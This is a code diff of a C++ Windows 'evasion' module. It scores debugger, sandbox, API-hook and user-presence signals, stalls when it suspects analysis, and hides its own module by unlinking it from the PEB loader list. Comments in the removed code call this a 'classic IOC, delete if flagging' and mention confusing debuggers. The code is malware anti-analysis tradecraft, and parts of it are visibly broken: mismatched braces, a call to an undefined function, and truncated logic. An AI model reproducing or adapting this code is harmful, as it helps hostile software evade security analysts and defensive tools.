@@ -1,32 +1,32 @@
 #include "evasion.h"
-#include <wincrypt.h>
 #include <windows.h>
 #include <intrin.h>
 #include <iphlpapi.h>
 #include <cmath>
 #include <random>
 #include <chrono>
+#include <cstring>
+#include <cstdio>
+
 #pragma comment(lib, "iphlpapi.lib")
 
-// 4 enviromental validation 
-typedef struct {
-    float debugscore;
-    float sandboxscore;
-    float integrityscore;
-    float userpresencescore;
-    float overallconfidence;
-} environment_score;
+#ifndef CONTAINING_RECORD
+#define CONTAINING_RECORD(address, type, field) ((type *)( \
+                                                  (char*)(address) - \
+                                                  (unsigned long long)(&((type *)0)->field)))
+#endif
 
-typedef enum {
-    operational_full = 0,
-    operational_degraded,
-    operational_minimal,
-    operational_halted
-} operational_state;
+#ifndef NT_SUCCESS
+typedef long ntstatus;
+#define NT_SUCCESS(Status) (((ntstatus)(Status)) >= 0)
+#endif
 
-// light control flow confusion, anti analysis, bogus workload 
-void execute_junk_calculations() {
-    volatile INT64 junk = 0xDEADBEEFDEADBEEF;
+#define peb_debug_offset 0x02
+#define peb_ldr_offset 0x18
+#define peb_memorder_offset 0x20
+
+void busywork() {
+    volatile long long junk = 0xDEADBEEFDEADBEEF;
     for (int i = 0; i < 150; i++) {
         junk = _rotl64(junk, 13);
         junk ^= 0xABCDEF1234567890;
@@ -37,36 +37,34 @@ void execute_junk_calculations() {
     }
 }
 
-// we need to return a rough frequency unit for timing stuff
-ULONGLONG get_cpu_frequency() {
-    static ULONGLONG frequency = 0;
+unsigned long long cpuspeed() {
+    static unsigned long long frequency = 0;
     if (frequency == 0) {
-        ULONGLONG start = __rdtsc();
+        unsigned long long start = __rdtsc();
         Sleep(100);
-        ULONGLONG end = __rdtsc();
+        unsigned long long end = __rdtsc();
         frequency = (end - start) / 100000;
     }
     return frequency;
 }
 
-// fuck up dbgrs, wait pseudo-random amounts of time by busy-waiting with junk
-void precise_delay(uint32_t milliseconds, float jitter_factor) {
+void waittime(uint32_t ms, float variance) {
     std::random_device rd;
     std::mt19937 gen(rd());
-    std::uniform_real_distribution<> dis(1.0 - jitter_factor, 1.0 + jitter_factor);
-    uint32_t jittered_ms = static_cast<uint32_t>(milliseconds * dis(gen));
-    ULONGLONG cycles_needed = jittered_ms * get_cpu_frequency();
-    ULONGLONG start = __rdtsc();
-    
-    while ((__rdtsc() - start) < cycles_needed) {
-        execute_junk_calculations();
+    std::uniform_real_distribution<> dis(1.0 - variance, 1.0 + variance);
+    uint32_t jittered = static_cast<uint32_t>(ms * dis(gen));
+    unsigned long long cycles = jittered * cpuspeed();
+    unsigned long long start = __rdtsc();
+
+    while ((__rdtsc() - start) < cycles) {
+        busywork();
         if (GetTickCount64() % 1000 < 10) {
-            SwitchToThread(); // sometimes call this to confuse with real workload
+            SwitchToThread();
         }
     }
 }
 
-float check_resource_thresholds() {
+float checkresources() {
     float score = 0.0f;
     SYSTEM_INFO sysinfo;
     GetSystemInfo(&sysinfo);
@@ -74,8 +72,7 @@ float check_resource_thresholds() {
         score += 0.2f;
         if (sysinfo.dwNumberOfProcessors % 2 != 0) score += 0.1f;
     }
-    // the logic for this entire part was that basically its detrimental to check resource thresholds, but these metrics are obnoxiously easy to spoof, so we will plausibly reward correct cores and extremely penalize spoof attempts
-    // this is pretty much why ive implemented heuristic and enviromental score analysis, probably the best method to approach this afaik
+
     MEMORYSTATUSEX memstatus;
     memstatus.dwLength = sizeof(memstatus);
     GlobalMemoryStatusEx(&memstatus);
@@ -85,67 +82,68 @@ float check_resource_thresholds() {
         float memscore = 0.3f * (1.0f - (float)(memstatus.ullTotalPhys - gb4) / (gb64 - gb4));
         score += memscore;
     }
-    
-    DWORD uptime = GetTickCount() / 60000; // uptime 
+
+    unsigned long uptime = GetTickCount() / 60000;
     if (uptime > 90 && uptime < 180) {
         score += 0.3f;
-    } else if (uptime > 30 && uptime < 480) {
+    }
+    else if (uptime > 30 && uptime < 480) {
         score += 0.1f;
     }
-    
+
     ULARGE_INTEGER freebytes;
     if (GetDiskFreeSpaceExA("C:\\", NULL, NULL, &freebytes)) {
         if (freebytes.QuadPart > 25ULL * 1024 * 1024 * 1024) {
             score += 0.2f;
         }
     }
-    
+
     return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
 }
 
-float analyze_human_input_pattern() {
+float watchmouse() {
     const int samples = 12;
     POINT positions[samples];
-    double movement_entropy = 0.0;
-    int total_movement = 0;
-    int direction_changes = 0;
-    
+    double entropy = 0.0;
+    int totalmove = 0;
+    int changes = 0;
+
     for (int i = 0; i < samples; i++) {
         GetCursorPos(&positions[i]);
-        precise_delay(80 + (i * 40), 0.3f);
+        waittime(80 + (i * 40), 0.3f);
     }
-    
-    int last_dx = 0, last_dy = 0;
+
+    int lastdx = 0, lastdy = 0;
     for (int i = 1; i < samples; i++) {
-        int dx = positions[i].x - positions[i-1].x;
-        int dy = positions[i].y - positions[i-1].y;
+        int dx = positions[i].x - positions[i - 1].x;
+        int dy = positions[i].y - positions[i - 1].y;
         int distance = abs(dx) + abs(dy);
-        total_movement += distance;
-        
+        totalmove += distance;
+
         if (distance > 0) {
             double angle = atan2(dy, dx);
-            movement_entropy += abs(sin(angle)) + abs(cos(angle));
-            
-            if ((dx * last_dx < 0) || (dy * last_dy < 0)) {
-                direction_changes++;
+            entropy += abs(sin(angle)) + abs(cos(angle));
+
+            if ((dx * lastdx < 0) || (dy * lastdy < 0)) {
+                changes++;
             }
-            last_dx = dx;
-            last_dy = dy;
+            lastdx = dx;
+            lastdy = dy;
         }
     }
-    
+
     float score = 0.0f;
-    if (total_movement > 150) score += 0.3f;
-    if (movement_entropy > 3.0) score += 0.3f;
-    if (direction_changes > samples / 2) score += 0.2f;
-    if (movement_entropy / samples > 0.4) score += 0.2f;
-    
+    if (totalmove > 150) score += 0.3f;
+    if (entropy > 3.0) score += 0.3f;
+    if (changes > samples / 2) score += 0.2f;
+    if (entropy / samples > 0.4) score += 0.2f;
+
     return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
 }
 
-float verify_api_integrity() {
+float checkapihooks() {
     float score = 1.0f;
-    const char* critical_apis[] = {
+    const char* apis[] = {
         "NtQueryInformationProcess",
         "NtSetInformationThread",
         "NtCreateFile",
@@ -154,243 +152,287 @@ float verify_api_integrity() {
         "NtAllocateVirtualMemory",
         "NtProtectVirtualMemory"
     };
-    
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+
+    void* ntdll = GetModuleHandleA("ntdll.dll");
     for (int i = 0; i < 7; i++) {
-        FARPROC api_func = GetProcAddress(ntdll, critical_apis[i]);
-        if (api_func) {
-            BYTE* code = (BYTE*)api_func;
-            
+        void* apifunc = GetProcAddress((HMODULE)ntdll, apis[i]);
+        if (apifunc) {
+            unsigned char* code = (unsigned char*)apifunc;
+
             if (code[0] == 0xE9 || code[0] == 0xCC) {
                 score -= 0.15f;
                 continue;
             }
-            
+
             if (code[0] == 0x48 && code[1] == 0xB8) {
                 score -= 0.2f;
                 continue;
             }
-            
+
             if (memcmp(code, "\x4C\x8B\xD1\xB8", 4) == 0) {
                 continue;
             }
-            
-            DWORD old_protect;
-            if (VirtualProtect(code, 32, PAGE_EXECUTE_READWRITE, &old_protect)) {
-                BYTE original_byte = code[0];
+
+            unsigned long oldprotect;
+            if (VirtualProtect(code, 32, PAGE_EXECUTE_READWRITE, &oldprotect)) {
+                unsigned char orig = code[0];
                 code[0] ^= 0x90;
-                if (code[0] != (original_byte ^ 0x90)) {
+                if (code[0] != (orig ^ 0x90)) {
                     score -= 0.3f;
                 }
-                code[0] = original_byte;
-                VirtualProtect(code, 32, old_protect, &old_protect);
+                code[0] = orig;
+                VirtualProtect(code, 32, oldprotect, &oldprotect);
             }
         }
     }
-    
+
     return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
 }
 
-float debug_detection() {
+float finddebugs() {
     float score = 1.0f;
+    printf("starting debug detection checks...\n");
+
+    if (IsDebuggerPresent()) {
+        score -= 0.4f;
+        printf("debugger found via isdebugger (-0.4)\n");
+    }
     
-    if (IsDebuggerPresent()) score -= 0.4f; // mediocre dont hate me for this, has to be here though
-    BOOL remotedebug = FALSE;
+    int remotedebug = 0;
     CheckRemoteDebuggerPresent(GetCurrentProcess(), &remotedebug);
-    if (remotedebug) score -= 0.3f;
+    if (remotedebug) {
+        score -= 0.3f;
+        printf("remote debugger found (-0.3)\n");
+    }
+
+    unsigned char* peb = (unsigned char*)__readgsqword(0x60);
+    if (peb[peb_debug_offset]) {
+        score -= 0.2f;
+        printf("peb debug flag set (-0.2)\n");
+    }
     
-    PPEB peb = (PPEB)__readgsqword(0x60);
-    if (peb->BeingDebugged) score -= 0.2f;
-    if (peb->NtGlobalFlag & 0x70) score -= 0.2f;
-    
-    CONTEXT ctx = {0};
+    unsigned long ntglobalflag = *(unsigned long*)(peb + 0xBC);
+    if (ntglobalflag & 0x70) {
+        score -= 0.2f;
+        printf("peb ntglobalflag shows debugging (-0.2)\n");
+    }
+
+    CONTEXT ctx = { 0 };
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     if (GetThreadContext(GetCurrentThread(), &ctx)) {
-        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) score -= 0.3f; // hw breakpoints
+        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
+            score -= 0.3f;
+            printf("hardware debug registers found (-0.3)\n");
+        }
     }
-    
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    FARPROC NtQueryInformationProcess = GetProcAddress(ntdll, "NtQueryInformationProcess");
-    if (NtQueryInformationProcess) {
-        typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
-        fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)NtQueryInformationProcess;
-        
-        DWORD debugport = 0;
-        NTSTATUS status = pNtQueryInformationProcess(GetCurrentProcess(), 7, &debugport, sizeof(debugport), NULL);
-        if (NT_SUCCESS(status) && debugport != 0) score -= 0.4f;
-        
-        DWORD debugflags = 0;
-        status = pNtQueryInformationProcess(GetCurrentProcess(), 0x1f, &debugflags, sizeof(debugflags), NULL);
-        if (NT_SUCCESS(status) && debugflags == 0) score -= 0.3f;
+
+    void* ntdll = GetModuleHandleA("ntdll.dll");
+    void* queryproc = GetProcAddress((HMODULE)ntdll, "NtQueryInformationProcess");
+    if (queryproc) {
+        typedef ntstatus(__stdcall* queryproc_t)(void*, unsigned long, void*, unsigned long, unsigned long*);
+        auto queryinfo = (queryproc_t)queryproc;
+
+        unsigned long debugport = 0;
+        ntstatus status = queryinfo(GetCurrentProcess(), 7, &debugport, sizeof(debugport), NULL);
+        if (NT_SUCCESS(status) && debugport != 0) {
+            score -= 0.4f;
+            printf("debug port found via ntquery (-0.4)\n");
+        }
+
+        unsigned long debugflags = 0;
+        status = queryinfo(GetCurrentProcess(), 0x1f, &debugflags, sizeof(debugflags), NULL);
+        if (NT_SUCCESS(status) && debugflags == 0) {
+            score -= 0.3f;
+            printf("debug flags show debugging (-0.3)\n");
+        }
     }
-    
-    ULONGLONG start = __rdtsc();
-    precise_delay(2, 0.1f);
-    ULONGLONG end = __rdtsc();
-    if ((end - start) > (get_cpu_frequency() * 3)) score -= 0.3f;
-    
+
+    unsigned long long start = __rdtsc();
+    waittime(2, 0.1f);
+    unsigned long long end = __rdtsc();
+    if ((end - start) > (cpuspeed() * 3)) {
+        score -= 0.3f;
+        printf("timing analysis suggests debugging/virtualization (-0.3)\n");
+    }
+
     __try {
         __debugbreak();
         score -= 0.2f;
-    } __except (EXCEPTION_EXECUTE_HANDLER) {}
-    
+        printf("debugbreak executed without exception (-0.2)\n");
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {}
+
+    printf("debug detection final score: %.2f\n", score);
     return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
 }
 
-float evaluate_environmental_context() {
+float checkenv() {
     float score = 0.5f;
-    
-    char domain[256] = {0};
-    DWORD size = sizeof(domain);
+    printf("starting environment context evaluation...\n");
+
+    char domain[256] = { 0 };
+    unsigned long size = sizeof(domain);
     if (GetEnvironmentVariableA("USERDOMAIN", domain, size) > 0) {
-        if (strlen(domain) > 3) score += 0.2f;
-    }
-    
-    const char* dev_tools[] = {"devenv.exe", "vscode.exe", "ida64.exe", "x64dbg.exe", "ollydbg.exe", "procmon.exe", "wireshark.exe"};
-    for (int i = 0; i < 7; i++) {
-        if (GetModuleHandleA(dev_tools[i]) != NULL) {
-            score -= 0.15f;
+        if (strlen(domain) > 3) {
+            score += 0.2f;
+            printf("domain name looks legit: %s (+0.2)\n", domain);
         }
     }
-    
+
+    const char* tools[] = { "devenv.exe", "vscode.exe", "ida64.exe", "x64dbg.exe", "ollydbg.exe", "procmon.exe", "wireshark.exe" };
+    for (int i = 0; i < 7; i++) {
+        if (GetModuleHandleA(tools[i]) != NULL) {
+            score -= 0.15f;
+            printf("dev tool detected: %s (-0.15)\n", tools[i]);
+        }
+    }
+
     SYSTEMTIME localtime;
     GetLocalTime(&localtime);
     if (localtime.wHour >= 8 && localtime.wHour <= 18) {
         score += 0.1f;
+        printf("execution during business hours (+0.1)\n");
+    } else {
+        printf("execution outside business hours (no bonus)\n");
     }
-    
+
+    printf("environment context final score: %.2f\n", score);
     return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
 }
 
-environment_score evaluate_environment() {
-    environment_score score = {0};
-    
-    score.integrityscore = verify_api_integrity();
-    precise_delay(300 + (GetTickCount() % 700), 0.4f);
-    
-    score.debugscore = advanced_debug_detection();
-    precise_delay(400 + (GetTickCount() % 600), 0.3f);
-    
-    score.sandboxscore = check_resource_thresholds();
-    score.userpresencescore = analyze_human_input_pattern();
-    
-    precise_delay(600 + (GetTickCount() % 900), 0.2f);
-    
-    float contextscore = evaluate_environmental_context();
-    score.overallconfidence = (
-        score.debugscore * 0.25f +
-        score.sandboxscore * 0.20f +
-        score.integrityscore * 0.25f +
-        score.userpresencescore * 0.20f +
+envstats getenvstats() {
+    envstats stats = { 0 };
+
+    stats.integrity = checkapihooks();
+    waittime(300 + (GetTickCount() % 700), 0.4f);
+
+    stats.debug = finddebugs();
+    waittime(400 + (GetTickCount() % 600), 0.3f);
+
+    stats.sandbox = checkresources();
+    stats.user = watchmouse();
+
+    waittime(600 + (GetTickCount() % 900), 0.2f);
+
+    float contextscore = checkenv();
+    stats.overall = (
+        stats.debug * 0.25f +
+        stats.sandbox * 0.20f +
+        stats.integrity * 0.25f +
+        stats.user * 0.20f +
         contextscore * 0.10f
-    );
-    
-    return score;
+        );
+
+    return stats;
 }
 
-//operational states here
-operational_state determine_operational_state(float confidence) {
-    if (confidence >= 0.8f) return operational_full;
-    if (confidence >= 0.6f) return operational_degraded;
-    if (confidence >= 0.4f) return operational_minimal;
-    return operational_halted;
+runmode pickmode(float confidence) {
+    if (confidence >= 0.8f) return fullmode;
+    if (confidence >= 0.6f) return halfmode;
+    if (confidence >= 0.4f) return slowmode;
+    return stopmode;
 }
 
-void execute_adaptive_operation(operational_state state) {
-    switch (state) {
-        case operational_full:
-            precise_delay(100 + (GetTickCount() % 400), 0.2f);
-            break;
-        case operational_degraded:
-            precise_delay(1500 + (GetTickCount() % 2000), 0.3f);
-            break;
-        case operational_minimal:
-            precise_delay(4000 + (GetTickCount() % 6000), 0.4f);
-            break;
-        case operational_halted:
-            precise_delay(15000 + (GetTickCount() % 30000), 0.5f);
-            break;
+void runmode_action(runmode mode) {
+    switch (mode) {
+    case fullmode:
+        waittime(100 + (GetTickCount() % 400), 0.2f);
+        break;
+    case halfmode:
+        waittime(1500 + (GetTickCount() % 2000), 0.3f);
+        break;
+    case slowmode:
+        waittime(4000 + (GetTickCount() % 6000), 0.4f);
+        break;
+    case stopmode:
+        waittime(15000 + (GetTickCount() % 30000), 0.5f);
+        break;
     }
 }
 
-DWORD WINAPI adaptive_operation_loop(LPVOID) {
+unsigned long __stdcall background_loop(void* unused) {
     while (true) {
-        environment_score current_score = evaluate_environment();
-        operational_state state = determine_operational_state(current_score.overallconfidence);
-        execute_adaptive_operation(state);
-        
-        uint32_t sleep_time = 8000 + static_cast<uint32_t>((1.0f - current_score.overallconfidence) * 35000);
-        precise_delay(sleep_time, 0.3f);
+        envstats current = getenvstats();
+        runmode mode = pickmode(current.overall);
+        runmode_action(mode);
+
+        uint32_t sleeptime = 8000 + static_cast<uint32_t>((1.0f - current.overall) * 35000);
+        waittime(sleeptime, 0.3f);
     }
     return 0;
 }
 
-void integrity_checks() {
-    PVOID base = GetModuleHandle(NULL);
-    PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)base;
-    PIMAGE_NT_HEADERS ntheaders = (PIMAGE_NT_HEADERS)((BYTE*)base + dosheader->e_lfanew);
-    
-    DWORD checksum = 0xDEADBEEF;
-    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntheaders);
-    
-    for (WORD i = 0; i < ntheaders->FileHeader.NumberOfSections; i++) {
+void selfcheck() {
+    void* base = GetModuleHandle(NULL);
+    auto dosheader = (IMAGE_DOS_HEADER*)base;
+    auto ntheaders = (IMAGE_NT_HEADERS*)((char*)base + dosheader->e_lfanew);
+
+    unsigned long checksum = 0xDEADBEEF;
+    auto section = IMAGE_FIRST_SECTION(ntheaders);
+
+    for (unsigned short i = 0; i < ntheaders->FileHeader.NumberOfSections; i++) {
         if (section->Characteristics & IMAGE_SCN_CNT_CODE) {
-            for (DWORD j = 0; j < section->SizeOfRawData; j++) {
-                checksum = (checksum << 5) + checksum + *((BYTE*)base + section->VirtualAddress + j);
+            for (unsigned long j = 0; j < section->SizeOfRawData; j++) {
+                checksum = (checksum << 5) + checksum + *((unsigned char*)base + section->VirtualAddress + j);
             }
             break;
         }
         section++;
     }
-    
+
     if (checksum < 0x10000000) ExitProcess(0);
 }
 
-BOOL is_safe_environment() {
-    environment_score score = evaluate_environment();
-    if (score.overallconfidence < 0.6f) return FALSE;
+int issafe() {
+    envstats stats = getenvstats();
     
+    printf("scoring :\n");
+    printf("  - debug score: %.2f\n", stats.debug);
+    printf("  - sandbox score: %.2f\n", stats.sandbox);
+    printf("  - integrity score: %.2f\n", stats.integrity);
+    printf("  - user presence score: %.2f\n", stats.user);
+    printf("  - overall confidence: %.2f (threshold: 0.60)\n", stats.overall);
+    
+    if (stats.overall < 0.6f) {
+        printf("environment confidence too low (%.2f < 0.6)\n", stats.overall);
+        return 0;
+    }
+
     __try {
         __debugbreak();
-        return FALSE;
-    } __except (EXCEPTION_EXECUTE_HANDLER) {}
-    
-    return TRUE;
+        printf("debugger detected via debugbreak\n");
+        return 0;
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        printf("no debugger detected via debugbreak\n");
+    }
+
+    printf("environment assessment: safe\n");
+    return 1;
 }
 
-// classic IOC, delete if flagging
-void hide_module(HMODULE hmodule) {
-    PPEB ppeb = (PPEB)__readgsqword(0x60);
-    PPEB_LDR_DATA pldr = ppeb->Ldr;
+void hideself(void* modulebase) {
+    unsigned char* peb = (unsigned char*)__readgsqword(0x60);
+    unsigned char* ldr = *(unsigned char**)(peb + peb_ldr_offset);
     
-    for (PLIST_ENTRY pentry = pldr->InLoadOrderModuleList.Flink; 
-         pentry != &pldr->InLoadOrderModuleList; 
-         pentry = pentry->Flink) {
-        PLDR_DATA_TABLE_ENTRY pmodule = (PLDR_DATA_TABLE_ENTRY)pentry;
-        if (pmodule->DllBase == hmodule) {
-            pmodule->InLoadOrderLinks.Blink->Flink = pmodule->InLoadOrderLinks.Flink;
-            pmodule->InLoadOrderLinks.Flink->Blink = pmodule->InLoadOrderLinks.Blink;
-            pmodule->InMemoryOrderLinks.Blink->Flink = pmodule->InMemoryOrderLinks.Flink;
-            pmodule->InMemoryOrderLinks.Flink->Blink = pmodule->InMemoryOrderLinks.Blink;
-            pmodule->InInitializationOrderLinks.Blink->Flink = pmodule->InInitializationOrderLinks.Flink;
-            pmodule->InInitializationOrderLinks.Flink->Blink = pmodule->InInitializationOrderLinks.Blink;
+    if (!ldr) return;
+    
+    auto modulelist = (LIST_ENTRY*)(ldr + peb_memorder_offset);
+    
+    for (auto entry = modulelist->Flink; entry != modulelist; entry = entry->Flink) {
+        unsigned char* moduleentry = (unsigned char*)entry - 0x10;
+        void* dllbase = *(void**)(moduleentry + 0x30); 
+        
+        if (dllbase == modulebase) {
+            entry->Blink->Flink = entry->Flink;
+            entry->Flink->Blink = entry->Blink;
             break;
         }
     }
 }
 
-void initialize_evasive_operations() {
-    float initialdebugscore = debug_detection();
-    if (initialdebugscore < 0.4f) 
-        precise_delay(45000 + (GetTickCount() % 30000), 0.4f);
-        return;
-    }
-    
-    environment_score score = evaluate_environment();
-    static bool full_capabilities_enabled = false;
-    
-    if (score.overallconfidence > 0.75f && !full_capabilities_enabled) {
-        full_capabilities_enabled = true;
-        CreateThread(NULL, 0, adaptive_operation_loop, NULL, 0, NULL);
-    }
+void startevasion() {
+    float initialdebug = finddebugs();
+    if (initialdebug < 0.4f)
+        waittime(45000 + (GetTickCount() % 30000), 0.4f);
 }
